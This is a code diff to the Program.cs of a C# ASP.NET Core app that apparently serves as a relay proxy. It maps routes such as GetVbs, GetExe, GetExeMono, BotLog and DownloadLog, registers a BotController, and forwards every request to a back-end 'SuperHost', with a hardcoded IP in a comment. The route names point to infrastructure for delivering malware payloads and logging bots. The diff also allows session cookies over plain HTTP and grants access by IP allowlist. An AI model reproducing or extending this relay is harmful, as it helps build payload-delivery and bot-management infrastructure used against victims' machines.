@@ -1,7 +1,6 @@
-using System.Security.Claims;
 using System.Text;
+using cp.Controllers;
 using Microsoft.AspNetCore.Authentication.Cookies;
-using Microsoft.AspNetCore.Authorization;
 using Microsoft.Extensions.FileProviders;
 using model;
 
@@ -11,7 +10,7 @@ public static class Program
 {
     public static string SuperHost => System.Environment.GetEnvironmentVariable("SuperHost", EnvironmentVariableTarget.Machine)!;
 
- //   public static string SuperHost => "185.247.141.76";
+ // public static string SuperHost => "185.247.141.76";
     
     public static bool IsSuperHost => !string.IsNullOrEmpty(SuperHost);
 
@@ -26,12 +25,13 @@ public static class Program
         builder.Services.AddMemoryCache();
         builder.Services.AddSession(options =>
         {
-            options.IdleTimeout = TimeSpan.FromDays(7); // Match cookie expiry
-            options.Cookie.IsEssential = true; // Ensure the cookie is always sent
+            options.IdleTimeout = TimeSpan.FromDays(7);
+            options.Cookie.IsEssential = true;
             options.Cookie.HttpOnly = true;
-            options.Cookie.SecurePolicy = CookieSecurePolicy.None; // Allow session cookies over HTTP
+            options.Cookie.SecurePolicy = CookieSecurePolicy.None;
         });
-        
+        builder.Services.AddScoped<BotController>(); 
+        builder.Services.AddScoped<StatsController>(); 
         builder.Services.AddControllersWithViews()
             .AddRazorPagesOptions(options =>
             {
@@ -59,20 +59,14 @@ public static class Program
             options.AddPolicy("AllowFromIpRange", policy =>
                 policy.RequireAssertion(context =>
                 {
-                    // Get the HttpContext from the context resource
                     var httpContext = context.Resource as HttpContext;
                     if (httpContext == null)
                     {
-                        return false; // If HttpContext is not available, deny access.
+                        return false;
                     }
-
                     var remoteIp = httpContext.Connection.RemoteIpAddress?.ToString();
-            
-                    // Check if the user is authenticated or the IP is allowed
                     bool isAuthenticated = httpContext.User.Identity?.IsAuthenticated ?? false;
-                    bool isIpAllowed = BackSvc.IsIpAllowed(remoteIp);  // Check if the IP is allowed
-
-                    // Allow if the user is authenticated OR the IP is allowed
+                    bool isIpAllowed = BackSvc.IsIpAllowed(remoteIp); 
                     return isAuthenticated || isIpAllowed;
                 }));
         });
@@ -130,19 +124,19 @@ public static class Program
         app.Map("/update", async context => { await ForwardRequest(context); });
 
 // Place the most specific routes first
-        app.Map("/{string}/{profile}/{random}/{target}/DnLog", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/{profile}/{random}/{target}/GetVbs", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/{profile}/GetVbsPhp", async context => { await ForwardRequest(context); });
+        app.Map("/{profile}/{random}/{target}/DnLog", async context => { await ForwardRequest(context); });
+        app.Map("/{profile}/{random}/{target}/GetVbs", async context => { await ForwardRequest(context); });
+        app.Map("/{profile}/GetVbsPhp", async context => { await ForwardRequest(context); });
 
 // Place routes with a single parameter next
-        app.Map("/{string}/upsert", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/update", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/Stats", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/BotLog", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/DownloadLog", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/GetIcon", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/GetExe", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/GetExeMono", async context => { await ForwardRequest(context); });
+        app.Map("/upsert", async context => { await ForwardRequest(context); });
+        app.Map("/update", async context => { await ForwardRequest(context); });
+        app.Map("/stats/dayly", async context => { await ForwardRequest(context); });
+        app.Map("/stats/botlog", async context => { await ForwardRequest(context); });
+        app.Map("/stats/downloadlog", async context => { await ForwardRequest(context); });
+        app.Map("/GetIcon", async context => { await ForwardRequest(context); });
+        app.Map("/GetExe", async context => { await ForwardRequest(context); });
+        app.Map("/GetExeMono", async context => { await ForwardRequest(context); });
 
 
 // Finally, place the catch-all route
@@ -153,19 +147,15 @@ public static class Program
     private static async Task ForwardRequest(HttpContext context, string remoteUrl = "")
     {
         remoteUrl = $"http://{SuperHost}/";
-        var server = BackSvc.GetServer(context.Request.Host);
+        var server = BackSvc.EvalServer(context.Request);
 
         using var client = new HttpClient();
 
         var path = context.Request.Path.ToString();
-
-        // Construct the target URL by combining the remote URL with the request path and query string
-        var targetUrl = $"{server}{path}{context.Request.QueryString}";
-        targetUrl = targetUrl.Replace($"{server}/{server}", $"{server}");
-
-        targetUrl = remoteUrl + targetUrl;
-        targetUrl = targetUrl.Replace($"{server}/{server}", $"{server}");
-        // Create the request message and copy the method, headers, and content from the incoming request
+        
+        var targetUrl = remoteUrl + $"{path}{context.Request.QueryString}";
+        targetUrl = targetUrl.Replace("//", "/");
+  
         var requestMessage = new HttpRequestMessage
         {
             Method = new HttpMethod(context.Request.Method),
@@ -224,6 +214,7 @@ public static class Program
         }
 
         requestMessage.Headers.Add("HTTP_X_FORWARDED_FOR", context.Connection.RemoteIpAddress.ToString());
+        requestMessage.Headers.Add("HTTP_X_SERVER", server);
 
         // Send the request to the remote server
         var responseMessage = await client.SendAsync(requestMessage);
